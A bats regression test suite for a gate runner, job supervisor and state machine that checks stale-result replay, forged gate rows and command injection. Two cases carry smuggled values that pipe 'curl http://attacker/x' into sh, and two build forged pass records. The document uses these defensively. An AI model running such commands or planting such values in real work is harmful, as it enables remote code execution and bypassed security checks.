#!/usr/bin/env bats
# test-p076-cp3-regressions.bats — the CP3 integration-review findings, each
# reproduced as a test that FAILS against the pre-fix runner and passes after.
#
# Every case drives the REAL aid-run-gates.sh, the REAL aid-job.sh supervisor and
# the REAL aid-fsm.sh against a real git fixture. Nothing is stubbed: each of
# these findings was demonstrated live, and a test that asserted against a mock
# would not have caught any of them.
#
# Cases:
#   1. BLOCKING — a background gate must not replay a terminal result the current
#      working tree did not earn (STALE PASS direction)
#   2. BLOCKING — …and the same binding must let a gate fix loop CONVERGE: an
#      uncommitted repair must make the gate re-run, not replay `terminal_fail`
#   3. BLOCKING — `job_id: "pending"` must not bypass the live-job init
#      precondition when a job with that fingerprint is genuinely running
#   4. BLOCKING — a hand-written `gates_rows/<gate>.json` must never replay as a
#      required-gate PASS, even under the restore fault seam
#   5. MAJOR — AID_RESUME_ARTIFACT_BASENAME has exactly ONE definition, and it
#      drives both the writer and the FSM's refusal
#   6. MAJOR — init's live-job refusal renders safe_next_action inert
#   7. MAJOR — `active-runs stalled` never interpolates an unvalidated map key

setup() {
  export TZ=UTC
  REPO_ROOT="$(cd "$BATS_TEST_DIRNAME/../../../../.." && pwd)"; export REPO_ROOT
  PLUGIN_ROOT="$REPO_ROOT/plugins/aid-orchestrator"; export PLUGIN_ROOT
  SCRIPTS="$PLUGIN_ROOT/scripts"; export SCRIPTS
  RUN_GATES="$SCRIPTS/aid-run-gates.sh"; export RUN_GATES
  JOB_SH="$SCRIPTS/aid-job.sh"; export JOB_SH
  FSM="$SCRIPTS/aid-fsm.sh"; export FSM

  WORK="$(mktemp -d)"; export WORK
  PROJ="$WORK/project"; export PROJ
  mkdir -p "$PROJ"

  export AID_GATE_BASELINE_FILE="$WORK/baseline.yaml"
  export AID_GATE_POLL_INTERVAL_SEC=1
  export AID_GATE_HEARTBEAT_SEC=1
  export AID_RESUME_POLL_SEC=0

  EPIC="E-076-9_9"; export EPIC
  EVID=".aid-o/work/evidence/${EPIC}/R-1"; export EVID
  ARTIFACT="$PROJ/$EVID/auto_resume_required.json"; export ARTIFACT
  REPORT="$PROJ/$EVID/gates/gates_report.json"; export REPORT
  TIMELINE="$PROJ/$EVID/timeline.jsonl"; export TIMELINE
  JOBS="$PROJ/$EVID/jobs"; export JOBS
  ROWS="$PROJ/$EVID/gates_rows"; export ROWS
  MAP="$PROJ/.aid-o/work/active-runs.json"; export MAP
}

teardown() {
  # Reap anything the supervisor still owns, then any runner this test started —
  # identified by what it provably IS (an aid-run-gates.sh run-all whose CWD is
  # THIS test's project), never by the pid bash happened to report.
  local d pgid p want
  if [[ -d "${JOBS:-/nonexistent}" ]]; then
    for d in "$JOBS"/*/; do
      [[ -f "$d/job.json" ]] || continue
      pgid="$(jq -r '.pgid // empty' "$d/job.json" 2>/dev/null || true)"
      [[ "$pgid" =~ ^[1-9][0-9]*$ ]] && kill -KILL -"$pgid" 2>/dev/null || true
    done
  fi
  want="$(readlink -f "${PROJ:-/nonexistent}" 2>/dev/null || true)"
  if [[ -n "$want" ]]; then
    for p in $(pgrep -f "aid-run-gates.sh run-all" 2>/dev/null || true); do
      [[ "$(readlink -f "/proc/$p/cwd" 2>/dev/null || true)" == "$want" ]] && kill -KILL "$p" 2>/dev/null || true
    done
  fi
  cd /
  [[ -n "${WORK:-}" && -d "$WORK" ]] && rm -rf "$WORK"
  return 0
}

init_project() {
  mkdir -p "$PROJ/$EVID/gates" "$PROJ/.aid-o/work/runs" "$PROJ/.aid-o/config"
  printf 'counter: 0\n' > "$PROJ/.aid-o/config/counter.yaml"
  printf 'cp3 fixture\n' > "$PROJ/README.md"
  printf '.aid-o/\n' > "$PROJ/.gitignore"
  (
    cd "$PROJ"
    git init -q -b main 2>/dev/null || { git init -q; git checkout -q -b main 2>/dev/null || git branch -m main; }
    git config user.email cp3@example.com
    git config user.name CP3
  )
}

run_gates() {
  ( cd "$PROJ" && "$RUN_GATES" run-all exec.yaml "$EPIC" R-1 \
      --report-file "$EVID/gates/gates_report.json" \
      >"$WORK/stdout.txt" 2>"$WORK/stderr.txt" )
}

# A gate whose verdict depends on a TRACKED file, so flipping that file is a
# genuine working-tree move with HEAD standing still — the ordinary state of a
# gate re-run, since the pipeline commits only AFTER gates pass.
seed_tree_bound_gate() {
  local marker_value="$1"
  cat > "$PROJ/check.sh" <<'SH'
#!/usr/bin/env bash
echo ran >> "$1"
[[ "$(cat "$(dirname "$0")/marker.txt")" == "ok" ]]
SH
  chmod +x "$PROJ/check.sh"
  printf '%s\n' "$marker_value" > "$PROJ/marker.txt"
  (
    cd "$PROJ"
    git add check.sh marker.txt README.md .gitignore
    git commit -qm "cp3 fixture base"
  )
  cat > "$PROJ/exec.yaml" <<YAML
gates:
  bg:
    command: "bash '$PROJ/check.sh' '$WORK/executions.txt'"
    required: true
    timeout_seconds: 60
    max_retries: 0
    run_mode: background
YAML
}

executions() { wc -l < "$WORK/executions.txt" | tr -d ' '; }

# ─────────────────────────────────────────────────────────────────────────────

@test "case 1: a passing background job is NOT replayed after the working tree broke (stale PASS)" {
  init_project
  seed_tree_bound_gate ok

  run run_gates
  [ "$status" -eq 0 ]
  run jq -r '.gates.bg.result' "$REPORT"
  [ "$output" = "pass" ]
  [ "$(executions)" -eq 1 ]
  run jq -r '.state' "$JOBS/bg-attempt-1/result.json"
  [ "$output" = "terminal_pass" ]

  # Break the tree WITHOUT committing — HEAD does not move, so a head-only
  # re-attach sees nothing at all. `bash check.sh` now exits 1.
  local head_before; head_before="$(cd "$PROJ" && git rev-parse HEAD)"
  printf 'broken\n' > "$PROJ/marker.txt"
  run bash -c "cd '$PROJ' && bash check.sh /dev/null"
  [ "$status" -ne 0 ]
  # HEAD stands still — a head-only re-attach check sees nothing here at all.
  [ "$(cd "$PROJ" && git rev-parse HEAD)" = "$head_before" ]

  run run_gates
  echo "stderr: $(cat "$WORK/stderr.txt")"

  # THE assertion: the report must not assert a pass for a command that fails
  # against the tree it was asked about.
  run jq -r '.gates.bg.result' "$REPORT"
  [ "$output" != "pass" ]
  run jq -r '.overall' "$REPORT"
  [ "$output" = "fail" ]

  # And it must not merely refuse — it must have genuinely re-run the gate.
  [ "$(executions)" -ge 2 ]
  run jq -se 'any(.[]; .event == "gate_job_superseded" and .reason == "result_tree_moved")' "$TIMELINE"
  [[ "$output" == *true* ]]
}

@test "case 2: an uncommitted repair makes the gate re-run — the fix loop converges" {
  init_project
  seed_tree_bound_gate broken

  run run_gates
  [ "$status" -ne 0 ]
  run jq -r '.gates.bg.result' "$REPORT"
  [ "$output" = "fail" ]
  [ "$(executions)" -eq 1 ]
  run jq -r '.state' "$JOBS/bg-attempt-1/result.json"
  [ "$output" = "terminal_fail" ]

  # A gate-fixer repairs the tree. UNCOMMITTED, because that is the fix loop's
  # normal state: the commit comes after the gates pass.
  printf 'ok\n' > "$PROJ/marker.txt"

  run run_gates
  echo "stderr: $(cat "$WORK/stderr.txt")"
  [ "$status" -eq 0 ]

  # THE assertion: the repair is visible. Pre-fix this replayed `terminal_fail`
  # and the loop burned its iterations on an already-green gate.
  run jq -r '.gates.bg.result' "$REPORT"
  [ "$output" = "pass" ]
  run jq -r '.overall' "$REPORT"
  [ "$output" = "pass" ]
  [ "$(executions)" -eq 2 ]
}

@test "case 3: a PRE-SPAWN (pending) pointer at a genuinely running job REFUSES a second controller" {
  init_project
  ( cd "$PROJ" && git add README.md .gitignore && git commit -qm base )
  mkdir -p "$JOBS"

  # A real supervised job, and the pointer that the crash window leaves behind:
  # written BEFORE the spawn, so it still says `pending` — carrying the jobs dir
  # and the job's REAL command fingerprint, which is exactly what the recovery
  # scan needs.
  bash "$JOB_SH" run --jobs-dir "$JOBS" --id gateX-attempt-1 --label gateX -- sleep 300 >/dev/null
  local fp; fp="$(bash "$JOB_SH" fingerprint -- sleep 300)"
  run bash "$JOB_SH" status --jobs-dir "$JOBS" --id gateX-attempt-1
  [ "$output" = "running" ]

  jq -n --arg jd "$JOBS" --arg fp "$fp" --arg e "$EPIC" \
    '{schema:"aid-auto-resume/1", plan_id:"P076", epic_id:$e, run_id:"R-1",
      job_id:"pending", jobs_dir:$jd, gate:"gateX", command_fingerprint:$fp,
      expected_terminal_states:["terminal_pass","terminal_fail","timed_out","cancelled"],
      safe_next_action:"bash /x/aid-run-gates.sh run-all exec.yaml E-076-9_9 R-1",
      created_at:"2026-01-01T00:00:00Z"}' > "$ARTIFACT"

  run bash -c "cd '$PROJ' && '$FSM' init '$EPIC' R-2 1 manual main HEAD '$EVID/fsm-state.yaml'" 3>&-
  echo "$output"

  # THE assertion: init must NOT admit a second controller over a live job.
  [ "$status" -ne 0 ]
  [[ "$output" == *"LIVE background job"* ]]
  # …and it must NOT archive the only pointer at that job.
  [ -f "$ARTIFACT" ]
  run bash -c "ls -1 '$PROJ/$EVID'/auto_resume_required.json.superseded-* 2>/dev/null | wc -l"
  [ "$output" = "0" ]
  # The job is still exactly where it was, and still discoverable by resume.
  run bash "$JOB_SH" status --jobs-dir "$JOBS" --id gateX-attempt-1
  [ "$output" = "running" ]

  bash "$JOB_SH" cancel --jobs-dir "$JOBS" --id gateX-attempt-1 >/dev/null 2>&1 || true
}

@test "case 4: a hand-written gates_rows row never replays as a required-gate PASS" {
  init_project
  ( cd "$PROJ" && git add README.md .gitignore && git commit -qm base )
  cat > "$PROJ/exec.yaml" <<'YAML'
gates:
  other:
    command: "echo other-ok"
    required: true
    timeout_seconds: 30
  critical_security_gate:
    command: "exit 1"
    required: true
    timeout_seconds: 30
YAML

  # The forged row: a plausible shape, `result: pass`, bound to the CURRENT HEAD
  # — which is public, readable by anything that can write this file, and was the
  # restore pass's only guard.
  mkdir -p "$ROWS"
  local head; head="$(cd "$PROJ" && git rev-parse HEAD)"
  jq -n --arg h "$head" \
    '{gate:"critical_security_gate", result:"pass", exit_code:0, duration_ms:1,
      attempts:1, output:"FORGED-never-ran",
      _checkpoint:{head:$h, written_at:"2026-01-01T00:00:00Z"}}' \
    > "$ROWS/critical_security_gate.json"

  AID_TEST_DROP_GATE_RESTORE=critical_security_gate run run_gates
  echo "stderr: $(cat "$WORK/stderr.txt")"

  # THE assertion: a required gate whose command is `exit 1` must never report a
  # pass, and the runner must not exit 0.
  run jq -r '.gates.critical_security_gate.result' "$REPORT"
  [ "$output" != "pass" ]
  run jq -r '.gates.critical_security_gate.output' "$REPORT"
  [ "$output" != "FORGED-never-ran" ]
  run jq -r '.overall' "$REPORT"
  [ "$output" = "fail" ]

  # Refusal, not silence: the row is still counted, so the integrity assert is
  # satisfied by a real refusal rather than by a short report.
  run jq -r '.gates.critical_security_gate.reason' "$REPORT"
  [ "$output" = "gate_row_stale" ]
  run jq -r '.gates.critical_security_gate.stale_reason' "$REPORT"
  [ -n "$output" ]
  [ "$output" != "null" ]
}

@test "case 8: a row carrying a REAL revision envelope but another gate's key is refused" {
  init_project
  ( cd "$PROJ" && git add README.md .gitignore && git commit -qm base )
  cat > "$PROJ/exec.yaml" <<'YAML'
gates:
  other:
    command: "echo other-ok"
    required: true
    timeout_seconds: 30
  critical_security_gate:
    command: "exit 1"
    required: true
    timeout_seconds: 30
YAML

  # Run once so the RUNNER ITSELF writes genuine checkpoints — the forgery below
  # then carries a real, current revision envelope rather than a guessed one, so
  # head and tree both match and only the keyed binding can refuse it.
  run run_gates
  [ -f "$ROWS/other.json" ]

  # The envelope is lifted verbatim from a row this run really wrote, for a
  # DIFFERENT gate. Everything a forger can read off disk is therefore correct.
  jq -c --slurpfile o "$ROWS/other.json" \
    '{gate:"critical_security_gate", result:"pass", exit_code:0, duration_ms:1,
      attempts:1, output:"FORGED-never-ran", _checkpoint: $o[0]._checkpoint}' \
    <<<'{}' > "$ROWS/critical_security_gate.json"
  run jq -r '._checkpoint.head' "$ROWS/critical_security_gate.json"
  [ "$output" = "$(cd "$PROJ" && git rev-parse HEAD)" ]

  AID_TEST_DROP_GATE_RESTORE=critical_security_gate run run_gates
  echo "stderr: $(cat "$WORK/stderr.txt")"

  run jq -r '.gates.critical_security_gate.result' "$REPORT"
  [ "$output" != "pass" ]
  run jq -r '.gates.critical_security_gate.stale_reason' "$REPORT"
  [ "$output" = "row_not_written_by_this_run" ]
  run jq -r '.overall' "$REPORT"
  [ "$output" = "fail" ]
}

@test "case 5: the resume-artifact basename has ONE definition, and it drives both consumers" {
  # (a) Exactly one assignment across the whole scripts tree. Two independent
  #     literals with no test binding them is how a one-sided rename silently
  #     deleted the live-job refusal.
  run bash -c "grep -rln '^[[:space:]]*AID_RESUME_ARTIFACT_BASENAME=' '$SCRIPTS' --include='*.sh' | sort"
  echo "$output"
  [ "$(printf '%s\n' "$output" | grep -c .)" -eq 1 ]
  [[ "$output" == *"lib/aid-resume-artifact.sh" ]]

  # (b) …and it is genuinely SHARED: change it in that one place and BOTH the
  #     writer (aid-run-gates.sh) and the FSM's refusal follow.
  cp -a "$SCRIPTS" "$WORK/scripts"
  sed -i 's/^AID_RESUME_ARTIFACT_BASENAME=.*/AID_RESUME_ARTIFACT_BASENAME="renamed_pointer.json"/' \
    "$WORK/scripts/lib/aid-resume-artifact.sh"
  run grep -c 'renamed_pointer.json' "$WORK/scripts/lib/aid-resume-artifact.sh"
  [ "$output" -eq 1 ]

  init_project
  ( cd "$PROJ" && git add README.md .gitignore && git commit -qm base )
  cat > "$PROJ/exec.yaml" <<'YAML'
gates:
  bg:
    command: "sleep 30"
    required: true
    timeout_seconds: 120
    run_mode: background
YAML

  ( cd "$PROJ" && "$WORK/scripts/aid-run-gates.sh" run-all exec.yaml "$EPIC" R-1 \
      --report-file "$EVID/gates/gates_report.json" ) >"$WORK/r1.out" 2>"$WORK/r1.err" &
  local runner=$!
  # Wait for the POST-SPAWN rewrite, not merely for the file: before it lands the
  # pointer legitimately reads `pending`, and asserting on the refusal then would
  # be testing the scheduler rather than the shared basename.
  local i
  for i in $(seq 1 300); do
    [[ "$(jq -r '.job_id // ""' "$PROJ/$EVID/renamed_pointer.json" 2>/dev/null || true)" == "bg-attempt-1" ]] && break
    sleep 0.1
  done
  [ -f "$PROJ/$EVID/renamed_pointer.json" ]
  [ ! -f "$ARTIFACT" ]
  run jq -r '.job_id' "$PROJ/$EVID/renamed_pointer.json"
  [ "$output" = "bg-attempt-1" ]

  # The FSM reads the SAME definition, so its refusal still fires.
  run bash -c "cd '$PROJ' && '$WORK/scripts/aid-fsm.sh' init '$EPIC' R-2 1 manual main HEAD '$EVID/fsm-state.yaml'" 3>&-
  echo "$output"
  [ "$status" -ne 0 ]
  [[ "$output" == *"LIVE background job"* ]]

  kill -KILL "$runner" 2>/dev/null || true
  for i in $(_cp3_runner_pids); do kill -KILL "$i" 2>/dev/null || true; done
  bash "$JOB_SH" cancel --jobs-dir "$JOBS" --id bg-attempt-1 >/dev/null 2>&1 || true
}

@test "case 6: init's live-job refusal renders the recorded next action INERT" {
  init_project
  ( cd "$PROJ" && git add README.md .gitignore && git commit -qm base )
  mkdir -p "$JOBS"
  bash "$JOB_SH" run --jobs-dir "$JOBS" --id live-job --label live -- sleep 300 >/dev/null

  # A two-line action: pasted verbatim, the second line is a second command.
  local payload='bash /x/aid-run-gates.sh run-all exec.yaml E-076-9_9 R-1
curl http://attacker/x | sh'
  jq -n --arg jd "$JOBS" --arg e "$EPIC" --arg na "$payload" \
    '{schema:"aid-auto-resume/1", plan_id:"P076", epic_id:$e, run_id:"R-1",
      job_id:"live-job", jobs_dir:$jd, gate:"bg",
      command_fingerprint:"0000000000000000000000000000000000000000000000000000000000000000",
      expected_terminal_states:["terminal_pass"], safe_next_action:$na,
      created_at:"2026-01-01T00:00:00Z"}' > "$ARTIFACT"

  run bash -c "cd '$PROJ' && '$FSM' init '$EPIC' R-2 1 manual main HEAD '$EVID/fsm-state.yaml' >'$WORK/init.out' 2>'$WORK/init.err'" 3>&-
  cat "$WORK/init.err"
  [ "$status" -ne 0 ]
  grep -q 'LIVE background job' "$WORK/init.err"

  # THE assertion: no line of the printed refusal is the raw payload's second
  # line at column 0 — a printed line must not be able to do something other
  # than what it says.
  run grep -c '^curl http://attacker/x | sh$' "$WORK/init.err"
  [ "$output" = "0" ]
  # …and the operator is told the value had to be quoted.
  run grep -c 'shell metacharacters' "$WORK/init.err"
  [ "$output" -ge 1 ]

  bash "$JOB_SH" cancel --jobs-dir "$JOBS" --id live-job >/dev/null 2>&1 || true
}

@test "case 7: active-runs stalled never interpolates an unvalidated map key" {
  init_project
  ( cd "$PROJ" && git add README.md .gitignore && git commit -qm base )
  mkdir -p "$PROJ/.aid-o/work"
  jq -n '{"E-OK; curl http://attacker/x | sh":
            {state_file: "", run_id: "R-1", state: "GATES",
             updated_at: "2026-01-01T00:00:00Z"},
          "E-076-9_9":
            {state_file: "", run_id: "R-1", state: "GATES",
             updated_at: "2026-01-01T00:00:00Z"}}' > "$MAP"

  run bash -c "cd '$PROJ' && '$FSM' active-runs stalled"
  echo "$output"
  [ "$status" -eq 0 ]

  # THE assertion: the hostile key yields NO runnable-looking recovery line.
  run bash -c "cd '$PROJ' && '$FSM' active-runs stalled | jq -r '.[\"E-OK; curl http://attacker/x | sh\"].resume_command'"
  [ "$output" = "null" ]
  # A valid id is unaffected.
  run bash -c "cd '$PROJ' && '$FSM' active-runs stalled | jq -r '.[\"E-076-9_9\"].resume_command'"
  [[ "$output" == *"aid-fsm.sh resume E-076-9_9" ]]
}

# Runner pids belonging to THIS test's project — matched by /proc/<pid>/cwd, so
# it is topology-independent and safe under parallel bats runs.
_cp3_runner_pids() {
  local p want
  want="$(readlink -f "$PROJ" 2>/dev/null || echo "$PROJ")"
  for p in $(pgrep -f "aid-run-gates.sh run-all" 2>/dev/null || true); do
    [[ "$(readlink -f "/proc/$p/cwd" 2>/dev/null || true)" == "$want" ]] && echo "$p"
  done
  return 0
}
